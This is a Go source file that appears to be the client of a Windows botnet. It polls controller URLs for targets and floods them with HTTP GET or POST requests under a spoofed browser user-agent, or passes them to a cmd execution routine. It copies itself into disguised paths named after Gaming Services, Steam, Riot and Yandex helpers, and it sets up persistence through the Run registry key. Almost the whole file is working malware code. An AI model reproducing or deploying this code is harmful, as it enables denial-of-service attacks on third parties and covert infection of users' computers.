package utils

import (
	"bytes"
	"io"
	"net/http"
	"os"
	"os/exec"
	"syscall"
	"time"
	"unsafe"
)

var (
	advapi32 = syscall.NewLazyDLL("advapi32.dll")

	regOpenKeyExW  = advapi32.NewProc("RegOpenKeyExW")
	regSetValueExW = advapi32.NewProc("RegSetValueExW")
	regCloseKey    = advapi32.NewProc("RegCloseKey")
)

const (
	HKEY_CURRENT_USER = 0x80000001
	KEY_SET_VALUE     = 0x0002
	REG_SZ            = 1
)

func AttackLoop(ret bool, url string, times int, method string, cmd string, conf []string) {
	ticker := time.Tick(time.Second)
	var start int = 0
	var sequence uint8 = 0
	for range ticker {
		if start >= times {
			//fmt.Println("ended")
			break
		}
		if sequence < 6 {
			if method == "get" || method == "post" {
				requestUrl(ret, url, method, cmd)
			} else if method == "cmd" {
				execCmd(url)
			}
			sequence++
		} else {
			sequence = 0
			time.Sleep(5 * time.Second)
		}
		start++

	}

	time.Sleep(60 * time.Second)
	//fmt.Println("retrurning")
response:
	var resp Response
	urls := ParseUrls()
	for i := 0; i < len(urls.Links); i++ {

		var err string = GetGoodRequest(true, urls.Links[i])
		if err != "bad" {
			resp = ParseTarget(err)

			break
		}

	}
	if resp.Typemethod != "" {
		AttackLoop(false, resp.Target, resp.Times, resp.Typemethod, string(resp.Cmd), resp.Mirrors)
	} else {
		goto response
	}

}

func requestUrl(ret bool, url string, method string, cmd string) string {
	/**defer func() {
		var resp Response = ParseTarget(GetGoodRequest(true, "http://127.0.0.9:5000/info"))
		AttackLoop(false, resp.Target, resp.Times, resp.Typemethod, string(resp.Cmd))
	}()**/
	var err error = nil
	var resp *http.Response = nil
	if method == "get" {
		client := &http.Client{}
		req, _ := http.NewRequest("GET", url, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
		resp, err = client.Do(req)
	} else if method == "post" {
		client := &http.Client{}
		req, _ := http.NewRequest("POST", url, bytes.NewBuffer([]byte(cmd)))
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

		resp, err = client.Do(req)
	} else {
		return ""
	}

	//fmt.Println("sending request to: " + url)

	if err != nil {
		return ""
	} else {

		defer resp.Body.Close()

	}

	if ret {
		body, _ := io.ReadAll(resp.Body)
		//fmt.Println("Response:", string(body))
		return string(body)
	} else {
		return ""
	}

}

func GetGoodRequest(ret bool, url string) string {

	client := &http.Client{}
	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

	resp, err := client.Do(req)

	if err != nil {
		time.Sleep(time.Second)

		//very bad :(

		return "bad"
	} else {
		defer resp.Body.Close()
	}

	if ret {
		body, _ := io.ReadAll(resp.Body)
		return string(body)
	} else {
		return ""
	}

}

func GetProcesses() map[string]string {
	ExeProcmap := make(map[string]string)
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	createSnapshot := kernel32.NewProc("CreateToolhelp32Snapshot")
	process32Next := kernel32.NewProc("Process32NextW")

	const TH32CS_SNAPPROCESS = 0x00000002

	snapshot, _, _ := createSnapshot.Call(TH32CS_SNAPPROCESS, 0)
	if snapshot == 0 {
		return nil
	}
	defer syscall.CloseHandle(syscall.Handle(snapshot))

	type ProcessEntry32 struct {
		Size            uint32
		Usage           uint32
		ProcessID       uint32
		DefaultHeapID   uintptr
		ModuleID        uint32
		Threads         uint32
		ParentProcessID uint32
		PriClassBase    int32
		Flags           uint32
		ExeFile         [260]uint16
	}

	var pe ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))

	ret, _, _ := process32Next.Call(snapshot, uintptr(unsafe.Pointer(&pe)))
	if ret == 0 {
		return nil
	}

	for {

		exeFile := syscall.UTF16ToString(pe.ExeFile[:])

		ExeProcmap[exeFile] = string(pe.Flags)

		ret, _, _ = process32Next.Call(snapshot, uintptr(unsafe.Pointer(&pe)))
		if ret == 0 {
			break
		}
	}

	return ExeProcmap

}

func execCmd(command string) {
	exec.Command("cmd", "/C", command)

}

func GetCurrentPath() string {
	file, _ := os.Executable()
	return string(file)
}

func fileExists(filename string) bool {
	info, err := os.Stat(filename)
	if os.IsNotExist(err) {
		return false
	}
	return !info.IsDir()
}

func Mimic() {
	ExeProcmap := GetProcesses()
	hostname, _ := os.UserCacheDir()
	sourcePath := hostname

	sourcePath = sourcePath + `\Microsoft\GameDVR\gamingservices.exe`
	if !fileExists(sourcePath) {
		inject(sourcePath, "Gaming Services")
	}

	for name := range ExeProcmap {

		switch name {
		case "steamwebhelper.exe":
			sourcePath = sourcePath + `\Steam\steamwebhelper.exe`
			if !fileExists(sourcePath) {
				inject(sourcePath, "SteamHelper")
			}
		case "vgtray.exe":
			sourcePath = sourcePath + `\Riot Games\vgtray.exe`
			if !fileExists(sourcePath) {
				inject(sourcePath, "Riot Notifications")
			}
		case "browser.exe":
			sourcePath = sourcePath + `\Yandex\YandexHelper.exe`
			if !fileExists(sourcePath) {
				inject(sourcePath, "Yandex Helper")
			}
		}
		sourcePath = hostname

	}
}

func gotoAutoexec(name string, path string) {
	var hKey uintptr
	subKey, _ := syscall.UTF16PtrFromString(`Software\Microsoft\Windows\CurrentVersion\Run`)

	ret, _, _ := regOpenKeyExW.Call(
		HKEY_CURRENT_USER,
		uintptr(unsafe.Pointer(subKey)),
		0,
		KEY_SET_VALUE,
		uintptr(unsafe.Pointer(&hKey)),
	)

	if ret != 0 {
		return
	}
	defer regCloseKey.Call(hKey)

	valueName, _ := syscall.UTF16PtrFromString(name)
	valueData, _ := syscall.UTF16PtrFromString(path)
	dataSize := (len(path) + 1) * 2

	_, _, _ = regSetValueExW.Call(
		hKey,
		uintptr(unsafe.Pointer(valueName)),
		0,
		REG_SZ,
		uintptr(unsafe.Pointer(valueData)),
		uintptr(dataSize),
	)

}

func inject(destPath string, name string) {
	file, _ := os.Open(GetCurrentPath())
	defer file.Close()

	destFile, _ := os.Create(destPath)
	defer destFile.Close()

	_, _ = io.Copy(destFile, file)

	gotoAutoexec(name, destPath)
}
